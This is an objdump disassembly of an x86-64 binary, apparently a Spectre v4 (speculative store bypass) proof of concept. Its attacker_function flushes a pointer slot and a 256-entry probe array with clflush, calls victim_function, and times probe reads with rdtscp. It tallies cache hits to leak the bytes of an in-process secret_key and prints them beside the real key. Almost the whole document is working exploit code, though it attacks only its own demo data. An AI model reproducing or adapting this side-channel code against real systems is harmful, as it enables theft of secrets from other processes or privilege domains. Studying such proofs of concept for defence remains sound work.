
bin/spectre-v4-flush.x86：     文件格式 elf64-x86-64


Disassembly of section .text:

00000000000010a0 <_start>:
    10a0:	f3 0f 1e fa          	endbr64 
    10a4:	31 ed                	xor    %ebp,%ebp
    10a6:	49 89 d1             	mov    %rdx,%r9
    10a9:	5e                   	pop    %rsi
    10aa:	48 89 e2             	mov    %rsp,%rdx
    10ad:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    10b1:	50                   	push   %rax
    10b2:	54                   	push   %rsp
    10b3:	45 31 c0             	xor    %r8d,%r8d
    10b6:	31 c9                	xor    %ecx,%ecx
    10b8:	48 8d 3d 52 05 00 00 	lea    0x552(%rip),%rdi        # 1611 <main>
    10bf:	ff 15 13 2f 00 00    	callq  *0x2f13(%rip)        # 3fd8 <__libc_start_main@GLIBC_2.34>
    10c5:	f4                   	hlt    
    10c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    10cd:	00 00 00 

00000000000010d0 <deregister_tm_clones>:
    10d0:	48 8d 3d 59 2f 00 00 	lea    0x2f59(%rip),%rdi        # 4030 <__TMC_END__>
    10d7:	48 8d 05 52 2f 00 00 	lea    0x2f52(%rip),%rax        # 4030 <__TMC_END__>
    10de:	48 39 f8             	cmp    %rdi,%rax
    10e1:	74 15                	je     10f8 <deregister_tm_clones+0x28>
    10e3:	48 8b 05 f6 2e 00 00 	mov    0x2ef6(%rip),%rax        # 3fe0 <_ITM_deregisterTMCloneTable>
    10ea:	48 85 c0             	test   %rax,%rax
    10ed:	74 09                	je     10f8 <deregister_tm_clones+0x28>
    10ef:	ff e0                	jmpq   *%rax
    10f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    10f8:	c3                   	retq   
    10f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001100 <register_tm_clones>:
    1100:	48 8d 3d 29 2f 00 00 	lea    0x2f29(%rip),%rdi        # 4030 <__TMC_END__>
    1107:	48 8d 35 22 2f 00 00 	lea    0x2f22(%rip),%rsi        # 4030 <__TMC_END__>
    110e:	48 29 fe             	sub    %rdi,%rsi
    1111:	48 89 f0             	mov    %rsi,%rax
    1114:	48 c1 ee 3f          	shr    $0x3f,%rsi
    1118:	48 c1 f8 03          	sar    $0x3,%rax
    111c:	48 01 c6             	add    %rax,%rsi
    111f:	48 d1 fe             	sar    %rsi
    1122:	74 14                	je     1138 <register_tm_clones+0x38>
    1124:	48 8b 05 c5 2e 00 00 	mov    0x2ec5(%rip),%rax        # 3ff0 <_ITM_registerTMCloneTable>
    112b:	48 85 c0             	test   %rax,%rax
    112e:	74 08                	je     1138 <register_tm_clones+0x38>
    1130:	ff e0                	jmpq   *%rax
    1132:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    1138:	c3                   	retq   
    1139:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001140 <__do_global_dtors_aux>:
    1140:	f3 0f 1e fa          	endbr64 
    1144:	80 3d f5 2e 00 00 00 	cmpb   $0x0,0x2ef5(%rip)        # 4040 <completed.8061>
    114b:	75 2b                	jne    1178 <__do_global_dtors_aux+0x38>
    114d:	55                   	push   %rbp
    114e:	48 83 3d a2 2e 00 00 	cmpq   $0x0,0x2ea2(%rip)        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    1155:	00 
    1156:	48 89 e5             	mov    %rsp,%rbp
    1159:	74 0c                	je     1167 <__do_global_dtors_aux+0x27>
    115b:	48 8b 3d a6 2e 00 00 	mov    0x2ea6(%rip),%rdi        # 4008 <__dso_handle>
    1162:	e8 f9 fe ff ff       	callq  1060 <__cxa_finalize@plt>
    1167:	e8 64 ff ff ff       	callq  10d0 <deregister_tm_clones>
    116c:	c6 05 cd 2e 00 00 01 	movb   $0x1,0x2ecd(%rip)        # 4040 <completed.8061>
    1173:	5d                   	pop    %rbp
    1174:	c3                   	retq   
    1175:	0f 1f 00             	nopl   (%rax)
    1178:	c3                   	retq   
    1179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001180 <frame_dummy>:
    1180:	f3 0f 1e fa          	endbr64 
    1184:	e9 77 ff ff ff       	jmpq   1100 <register_tm_clones>

0000000000001189 <victim_function>:
    1189:	f3 0f 1e fa          	endbr64 
    118d:	55                   	push   %rbp
    118e:	48 89 e5             	mov    %rsp,%rbp
    1191:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1195:	48 8b 05 c4 76 00 00 	mov    0x76c4(%rip),%rax        # 8860 <memory_slot_ptr>
    119c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    11a0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    11a4:	48 8d 15 75 2e 00 00 	lea    0x2e75(%rip),%rdx        # 4020 <public_key>
    11ab:	48 89 10             	mov    %rdx,(%rax)
    11ae:	48 8b 15 ab 6e 00 00 	mov    0x6eab(%rip),%rdx        # 8060 <memory_slot>
    11b5:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    11b9:	48 01 d0             	add    %rdx,%rax
    11bc:	0f b6 00             	movzbl (%rax),%eax
    11bf:	0f b6 c0             	movzbl %al,%eax
    11c2:	c1 e0 06             	shl    $0x6,%eax
    11c5:	48 98                	cltq   
    11c7:	48 8d 15 92 2e 00 00 	lea    0x2e92(%rip),%rdx        # 4060 <probe>
    11ce:	0f b6 04 10          	movzbl (%rax,%rdx,1),%eax
    11d2:	88 05 69 2e 00 00    	mov    %al,0x2e69(%rip)        # 4041 <tmp>
    11d8:	90                   	nop
    11d9:	5d                   	pop    %rbp
    11da:	c3                   	retq   

00000000000011db <attacker_function>:
    11db:	f3 0f 1e fa          	endbr64 
    11df:	55                   	push   %rbp
    11e0:	48 89 e5             	mov    %rsp,%rbp
    11e3:	48 81 ec 90 04 00 00 	sub    $0x490,%rsp
    11ea:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    11f1:	00 00 
    11f3:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    11f7:	31 c0                	xor    %eax,%eax
    11f9:	48 c7 45 ef 00 00 00 	movq   $0x0,-0x11(%rbp)
    1200:	00 
    1201:	c6 45 f7 00          	movb   $0x0,-0x9(%rbp)
    1205:	c7 85 80 fb ff ff 00 	movl   $0x0,-0x480(%rbp)
    120c:	00 00 00 
    120f:	e9 d9 03 00 00       	jmpq   15ed <attacker_function+0x412>
    1214:	48 8d 95 e0 fb ff ff 	lea    -0x420(%rbp),%rdx
    121b:	b8 00 00 00 00       	mov    $0x0,%eax
    1220:	b9 80 00 00 00       	mov    $0x80,%ecx
    1225:	48 89 d7             	mov    %rdx,%rdi
    1228:	f3 48 ab             	rep stos %rax,%es:(%rdi)
    122b:	c7 85 7c fb ff ff 00 	movl   $0x0,-0x484(%rbp)
    1232:	00 00 00 
    1235:	c7 85 84 fb ff ff 00 	movl   $0x0,-0x47c(%rbp)
    123c:	00 00 00 
    123f:	e9 8f 01 00 00       	jmpq   13d3 <attacker_function+0x1f8>
    1244:	48 8d 05 15 6e 00 00 	lea    0x6e15(%rip),%rax        # 8060 <memory_slot>
    124b:	48 89 05 0e 76 00 00 	mov    %rax,0x760e(%rip)        # 8860 <memory_slot_ptr>
    1252:	48 8d 05 b7 2d 00 00 	lea    0x2db7(%rip),%rax        # 4010 <secret_key>
    1259:	48 89 05 00 6e 00 00 	mov    %rax,0x6e00(%rip)        # 8060 <memory_slot>
    1260:	48 8d 05 f9 75 00 00 	lea    0x75f9(%rip),%rax        # 8860 <memory_slot_ptr>
    1267:	48 89 85 b0 fb ff ff 	mov    %rax,-0x450(%rbp)
    126e:	48 8b 85 b0 fb ff ff 	mov    -0x450(%rbp),%rax
    1275:	0f ae 38             	clflush (%rax)
    1278:	90                   	nop
    1279:	c7 85 88 fb ff ff 00 	movl   $0x0,-0x478(%rbp)
    1280:	00 00 00 
    1283:	eb 2e                	jmp    12b3 <attacker_function+0xd8>
    1285:	8b 85 88 fb ff ff    	mov    -0x478(%rbp),%eax
    128b:	c1 e0 06             	shl    $0x6,%eax
    128e:	48 98                	cltq   
    1290:	48 8d 15 c9 2d 00 00 	lea    0x2dc9(%rip),%rdx        # 4060 <probe>
    1297:	48 01 d0             	add    %rdx,%rax
    129a:	48 89 85 b8 fb ff ff 	mov    %rax,-0x448(%rbp)
    12a1:	48 8b 85 b8 fb ff ff 	mov    -0x448(%rbp),%rax
    12a8:	0f ae 38             	clflush (%rax)
    12ab:	90                   	nop
    12ac:	83 85 88 fb ff ff 01 	addl   $0x1,-0x478(%rbp)
    12b3:	81 bd 88 fb ff ff ff 	cmpl   $0xff,-0x478(%rbp)
    12ba:	00 00 00 
    12bd:	7e c6                	jle    1285 <attacker_function+0xaa>
    12bf:	0f ae f0             	mfence 
    12c2:	90                   	nop
    12c3:	8b 85 80 fb ff ff    	mov    -0x480(%rbp),%eax
    12c9:	48 98                	cltq   
    12cb:	48 89 c7             	mov    %rax,%rdi
    12ce:	e8 b6 fe ff ff       	callq  1189 <victim_function>
    12d3:	c7 85 8c fb ff ff 00 	movl   $0x0,-0x474(%rbp)
    12da:	00 00 00 
    12dd:	e9 da 00 00 00       	jmpq   13bc <attacker_function+0x1e1>
    12e2:	8b 85 8c fb ff ff    	mov    -0x474(%rbp),%eax
    12e8:	c1 e0 06             	shl    $0x6,%eax
    12eb:	48 98                	cltq   
    12ed:	48 8d 15 6c 2d 00 00 	lea    0x2d6c(%rip),%rdx        # 4060 <probe>
    12f4:	48 01 d0             	add    %rdx,%rax
    12f7:	48 89 85 98 fb ff ff 	mov    %rax,-0x468(%rbp)
    12fe:	48 8d 85 7c fb ff ff 	lea    -0x484(%rbp),%rax
    1305:	48 89 85 c8 fb ff ff 	mov    %rax,-0x438(%rbp)
    130c:	0f 01 f9             	rdtscp 
    130f:	89 ce                	mov    %ecx,%esi
    1311:	48 8b 8d c8 fb ff ff 	mov    -0x438(%rbp),%rcx
    1318:	89 31                	mov    %esi,(%rcx)
    131a:	48 c1 e2 20          	shl    $0x20,%rdx
    131e:	48 09 d0             	or     %rdx,%rax
    1321:	48 89 85 a0 fb ff ff 	mov    %rax,-0x460(%rbp)
    1328:	48 8b 85 98 fb ff ff 	mov    -0x468(%rbp),%rax
    132f:	0f b6 00             	movzbl (%rax),%eax
    1332:	0f b6 c0             	movzbl %al,%eax
    1335:	89 85 7c fb ff ff    	mov    %eax,-0x484(%rbp)
    133b:	48 8d 85 7c fb ff ff 	lea    -0x484(%rbp),%rax
    1342:	48 89 85 c0 fb ff ff 	mov    %rax,-0x440(%rbp)
    1349:	0f 01 f9             	rdtscp 
    134c:	89 ce                	mov    %ecx,%esi
    134e:	48 8b 8d c0 fb ff ff 	mov    -0x440(%rbp),%rcx
    1355:	89 31                	mov    %esi,(%rcx)
    1357:	48 c1 e2 20          	shl    $0x20,%rdx
    135b:	48 09 d0             	or     %rdx,%rax
    135e:	48 2b 85 a0 fb ff ff 	sub    -0x460(%rbp),%rax
    1365:	48 89 85 a8 fb ff ff 	mov    %rax,-0x458(%rbp)
    136c:	48 83 bd a8 fb ff ff 	cmpq   $0x4f,-0x458(%rbp)
    1373:	4f 
    1374:	77 3f                	ja     13b5 <attacker_function+0x1da>
    1376:	8b 85 80 fb ff ff    	mov    -0x480(%rbp),%eax
    137c:	48 98                	cltq   
    137e:	48 8d 15 9b 2c 00 00 	lea    0x2c9b(%rip),%rdx        # 4020 <public_key>
    1385:	0f b6 04 10          	movzbl (%rax,%rdx,1),%eax
    1389:	0f b6 c0             	movzbl %al,%eax
    138c:	39 85 8c fb ff ff    	cmp    %eax,-0x474(%rbp)
    1392:	74 21                	je     13b5 <attacker_function+0x1da>
    1394:	8b 85 8c fb ff ff    	mov    -0x474(%rbp),%eax
    139a:	48 98                	cltq   
    139c:	8b 84 85 e0 fb ff ff 	mov    -0x420(%rbp,%rax,4),%eax
    13a3:	8d 50 01             	lea    0x1(%rax),%edx
    13a6:	8b 85 8c fb ff ff    	mov    -0x474(%rbp),%eax
    13ac:	48 98                	cltq   
    13ae:	89 94 85 e0 fb ff ff 	mov    %edx,-0x420(%rbp,%rax,4)
    13b5:	83 85 8c fb ff ff 01 	addl   $0x1,-0x474(%rbp)
    13bc:	81 bd 8c fb ff ff ff 	cmpl   $0xff,-0x474(%rbp)
    13c3:	00 00 00 
    13c6:	0f 8e 16 ff ff ff    	jle    12e2 <attacker_function+0x107>
    13cc:	83 85 84 fb ff ff 01 	addl   $0x1,-0x47c(%rbp)
    13d3:	83 bd 84 fb ff ff 63 	cmpl   $0x63,-0x47c(%rbp)
    13da:	0f 8e 64 fe ff ff    	jle    1244 <attacker_function+0x69>
    13e0:	66 c7 45 ed 00 00    	movw   $0x0,-0x13(%rbp)
    13e6:	48 c7 85 d0 fb ff ff 	movq   $0x0,-0x430(%rbp)
    13ed:	00 00 00 00 
    13f1:	48 c7 85 d8 fb ff ff 	movq   $0x0,-0x428(%rbp)
    13f8:	00 00 00 00 
    13fc:	48 c7 85 90 fb ff ff 	movq   $0x0,-0x470(%rbp)
    1403:	00 00 00 00 
    1407:	e9 9b 00 00 00       	jmpq   14a7 <attacker_function+0x2cc>
    140c:	48 8b 85 90 fb ff ff 	mov    -0x470(%rbp),%rax
    1413:	8b 84 85 e0 fb ff ff 	mov    -0x420(%rbp,%rax,4),%eax
    141a:	48 63 d0             	movslq %eax,%rdx
    141d:	48 8b 85 d0 fb ff ff 	mov    -0x430(%rbp),%rax
    1424:	48 39 c2             	cmp    %rax,%rdx
    1427:	76 38                	jbe    1461 <attacker_function+0x286>
    1429:	48 8b 85 d0 fb ff ff 	mov    -0x430(%rbp),%rax
    1430:	48 89 85 d8 fb ff ff 	mov    %rax,-0x428(%rbp)
    1437:	48 8b 85 90 fb ff ff 	mov    -0x470(%rbp),%rax
    143e:	8b 84 85 e0 fb ff ff 	mov    -0x420(%rbp,%rax,4),%eax
    1445:	48 98                	cltq   
    1447:	48 89 85 d0 fb ff ff 	mov    %rax,-0x430(%rbp)
    144e:	0f b6 45 ed          	movzbl -0x13(%rbp),%eax
    1452:	88 45 ee             	mov    %al,-0x12(%rbp)
    1455:	48 8b 85 90 fb ff ff 	mov    -0x470(%rbp),%rax
    145c:	88 45 ed             	mov    %al,-0x13(%rbp)
    145f:	eb 3e                	jmp    149f <attacker_function+0x2c4>
    1461:	48 8b 85 90 fb ff ff 	mov    -0x470(%rbp),%rax
    1468:	8b 84 85 e0 fb ff ff 	mov    -0x420(%rbp,%rax,4),%eax
    146f:	48 63 d0             	movslq %eax,%rdx
    1472:	48 8b 85 d8 fb ff ff 	mov    -0x428(%rbp),%rax
    1479:	48 39 c2             	cmp    %rax,%rdx
    147c:	76 21                	jbe    149f <attacker_function+0x2c4>
    147e:	48 8b 85 90 fb ff ff 	mov    -0x470(%rbp),%rax
    1485:	8b 84 85 e0 fb ff ff 	mov    -0x420(%rbp,%rax,4),%eax
    148c:	48 98                	cltq   
    148e:	48 89 85 d8 fb ff ff 	mov    %rax,-0x428(%rbp)
    1495:	48 8b 85 90 fb ff ff 	mov    -0x470(%rbp),%rax
    149c:	88 45 ee             	mov    %al,-0x12(%rbp)
    149f:	48 83 85 90 fb ff ff 	addq   $0x1,-0x470(%rbp)
    14a6:	01 
    14a7:	48 81 bd 90 fb ff ff 	cmpq   $0xff,-0x470(%rbp)
    14ae:	ff 00 00 00 
    14b2:	0f 86 54 ff ff ff    	jbe    140c <attacker_function+0x231>
    14b8:	0f b6 55 ed          	movzbl -0x13(%rbp),%edx
    14bc:	8b 85 80 fb ff ff    	mov    -0x480(%rbp),%eax
    14c2:	48 98                	cltq   
    14c4:	48 8d 0d 45 2b 00 00 	lea    0x2b45(%rip),%rcx        # 4010 <secret_key>
    14cb:	0f b6 04 08          	movzbl (%rax,%rcx,1),%eax
    14cf:	38 c2                	cmp    %al,%dl
    14d1:	74 1b                	je     14ee <attacker_function+0x313>
    14d3:	0f b6 55 ee          	movzbl -0x12(%rbp),%edx
    14d7:	8b 85 80 fb ff ff    	mov    -0x480(%rbp),%eax
    14dd:	48 98                	cltq   
    14df:	48 8d 0d 2a 2b 00 00 	lea    0x2b2a(%rip),%rcx        # 4010 <secret_key>
    14e6:	0f b6 04 08          	movzbl (%rax,%rcx,1),%eax
    14ea:	38 c2                	cmp    %al,%dl
    14ec:	75 7d                	jne    156b <attacker_function+0x390>
    14ee:	0f b6 45 ee          	movzbl -0x12(%rbp),%eax
    14f2:	44 0f b6 c0          	movzbl %al,%r8d
    14f6:	0f b6 45 ee          	movzbl -0x12(%rbp),%eax
    14fa:	0f b6 f8             	movzbl %al,%edi
    14fd:	48 8b 8d d8 fb ff ff 	mov    -0x428(%rbp),%rcx
    1504:	0f b6 45 ed          	movzbl -0x13(%rbp),%eax
    1508:	44 0f b6 c8          	movzbl %al,%r9d
    150c:	0f b6 45 ed          	movzbl -0x13(%rbp),%eax
    1510:	44 0f b6 d0          	movzbl %al,%r10d
    1514:	48 8b 95 d0 fb ff ff 	mov    -0x430(%rbp),%rdx
    151b:	8b 85 80 fb ff ff    	mov    -0x480(%rbp),%eax
    1521:	48 98                	cltq   
    1523:	48 8d 35 e6 2a 00 00 	lea    0x2ae6(%rip),%rsi        # 4010 <secret_key>
    152a:	0f b6 04 30          	movzbl (%rax,%rsi,1),%eax
    152e:	0f b6 c0             	movzbl %al,%eax
    1531:	8b b5 80 fb ff ff    	mov    -0x480(%rbp),%esi
    1537:	48 63 f6             	movslq %esi,%rsi
    153a:	4c 8d 1d df 2a 00 00 	lea    0x2adf(%rip),%r11        # 4020 <public_key>
    1541:	4c 01 de             	add    %r11,%rsi
    1544:	48 83 ec 08          	sub    $0x8,%rsp
    1548:	41 50                	push   %r8
    154a:	57                   	push   %rdi
    154b:	51                   	push   %rcx
    154c:	45 89 d0             	mov    %r10d,%r8d
    154f:	48 89 d1             	mov    %rdx,%rcx
    1552:	89 c2                	mov    %eax,%edx
    1554:	48 8d 3d ad 0a 00 00 	lea    0xaad(%rip),%rdi        # 2008 <_IO_stdin_used+0x8>
    155b:	b8 00 00 00 00       	mov    $0x0,%eax
    1560:	e8 2b fb ff ff       	callq  1090 <printf@plt>
    1565:	48 83 c4 20          	add    $0x20,%rsp
    1569:	eb 7b                	jmp    15e6 <attacker_function+0x40b>
    156b:	0f b6 45 ee          	movzbl -0x12(%rbp),%eax
    156f:	44 0f b6 c0          	movzbl %al,%r8d
    1573:	0f b6 45 ee          	movzbl -0x12(%rbp),%eax
    1577:	0f b6 f8             	movzbl %al,%edi
    157a:	48 8b 8d d8 fb ff ff 	mov    -0x428(%rbp),%rcx
    1581:	0f b6 45 ed          	movzbl -0x13(%rbp),%eax
    1585:	44 0f b6 c8          	movzbl %al,%r9d
    1589:	0f b6 45 ed          	movzbl -0x13(%rbp),%eax
    158d:	44 0f b6 d0          	movzbl %al,%r10d
    1591:	48 8b 95 d0 fb ff ff 	mov    -0x430(%rbp),%rdx
    1598:	8b 85 80 fb ff ff    	mov    -0x480(%rbp),%eax
    159e:	48 98                	cltq   
    15a0:	48 8d 35 69 2a 00 00 	lea    0x2a69(%rip),%rsi        # 4010 <secret_key>
    15a7:	0f b6 04 30          	movzbl (%rax,%rsi,1),%eax
    15ab:	0f b6 c0             	movzbl %al,%eax
    15ae:	8b b5 80 fb ff ff    	mov    -0x480(%rbp),%esi
    15b4:	48 63 f6             	movslq %esi,%rsi
    15b7:	4c 8d 1d 62 2a 00 00 	lea    0x2a62(%rip),%r11        # 4020 <public_key>
    15be:	4c 01 de             	add    %r11,%rsi
    15c1:	48 83 ec 08          	sub    $0x8,%rsp
    15c5:	41 50                	push   %r8
    15c7:	57                   	push   %rdi
    15c8:	51                   	push   %rcx
    15c9:	45 89 d0             	mov    %r10d,%r8d
    15cc:	48 89 d1             	mov    %rdx,%rcx
    15cf:	89 c2                	mov    %eax,%edx
    15d1:	48 8d 3d 90 0a 00 00 	lea    0xa90(%rip),%rdi        # 2068 <_IO_stdin_used+0x68>
    15d8:	b8 00 00 00 00       	mov    $0x0,%eax
    15dd:	e8 ae fa ff ff       	callq  1090 <printf@plt>
    15e2:	48 83 c4 20          	add    $0x20,%rsp
    15e6:	83 85 80 fb ff ff 01 	addl   $0x1,-0x480(%rbp)
    15ed:	83 bd 80 fb ff ff 07 	cmpl   $0x7,-0x480(%rbp)
    15f4:	0f 8e 1a fc ff ff    	jle    1214 <attacker_function+0x39>
    15fa:	90                   	nop
    15fb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    15ff:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
    1606:	00 00 
    1608:	74 05                	je     160f <attacker_function+0x434>
    160a:	e8 71 fa ff ff       	callq  1080 <__stack_chk_fail@plt>
    160f:	c9                   	leaveq 
    1610:	c3                   	retq   

0000000000001611 <main>:
    1611:	f3 0f 1e fa          	endbr64 
    1615:	55                   	push   %rbp
    1616:	48 89 e5             	mov    %rsp,%rbp
    1619:	48 83 ec 10          	sub    $0x10,%rsp
    161d:	48 8d 3d a4 0a 00 00 	lea    0xaa4(%rip),%rdi        # 20c8 <_IO_stdin_used+0xc8>
    1624:	e8 47 fa ff ff       	callq  1070 <puts@plt>
    1629:	48 8d 35 e0 29 00 00 	lea    0x29e0(%rip),%rsi        # 4010 <secret_key>
    1630:	48 8d 3d bb 0a 00 00 	lea    0xabb(%rip),%rdi        # 20f2 <_IO_stdin_used+0xf2>
    1637:	b8 00 00 00 00       	mov    $0x0,%eax
    163c:	e8 4f fa ff ff       	callq  1090 <printf@plt>
    1641:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
    1648:	eb 14                	jmp    165e <main+0x4d>
    164a:	8b 45 fc             	mov    -0x4(%rbp),%eax
    164d:	48 98                	cltq   
    164f:	48 8d 15 0a 2a 00 00 	lea    0x2a0a(%rip),%rdx        # 4060 <probe>
    1656:	c6 04 10 01          	movb   $0x1,(%rax,%rdx,1)
    165a:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
    165e:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1661:	3d ff 3f 00 00       	cmp    $0x3fff,%eax
    1666:	76 e2                	jbe    164a <main+0x39>
    1668:	b8 00 00 00 00       	mov    $0x0,%eax
    166d:	e8 69 fb ff ff       	callq  11db <attacker_function>
    1672:	b8 00 00 00 00       	mov    $0x0,%eax
    1677:	c9                   	leaveq 
    1678:	c3                   	retq   
